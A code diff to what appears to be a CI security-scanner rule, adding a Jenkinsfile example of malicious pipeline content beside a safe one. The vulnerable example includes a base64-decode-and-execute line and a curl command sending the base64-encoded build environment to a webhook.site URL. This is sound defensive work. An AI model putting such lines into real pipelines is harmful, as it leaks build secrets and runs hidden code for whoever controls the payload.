@@ -40,6 +40,36 @@ RULE = Rule(
         "MEDIUM`` to ignore all matches; the rule still surfaces the "
         "hit for teams that want to spot-check.",
     ),
+    exploit_example=(
+        "// Vulnerable: a stage body executes a base64-decoded\n"
+        "// payload, exfils to a third-party webhook, or runs a\n"
+        "// known miner binary. A malicious PR (or a compromised\n"
+        "// maintainer) lands the payload in the Jenkinsfile;\n"
+        "// every subsequent build runs it.\n"
+        "pipeline {\n"
+        "  agent any\n"
+        "  stages {\n"
+        "    stage('build') {\n"
+        "      steps {\n"
+        "        sh '''\n"
+        "          echo Z2g6Li4uIA== | base64 -d | sh\n"
+        "          curl https://webhook.site/abc?env=$(env|base64)\n"
+        "        '''\n"
+        "      }\n"
+        "    }\n"
+        "  }\n"
+        "}\n"
+        "\n"
+        "// Safe: the build does only what the build does. No\n"
+        "// obfuscated execution, no exfil POSTs, no\n"
+        "// base64 -d | sh pipelines.\n"
+        "pipeline {\n"
+        "  agent any\n"
+        "  stages {\n"
+        "    stage('build') { steps { sh 'make build' } }\n"
+        "  }\n"
+        "}"
+    ),
 )
 
 
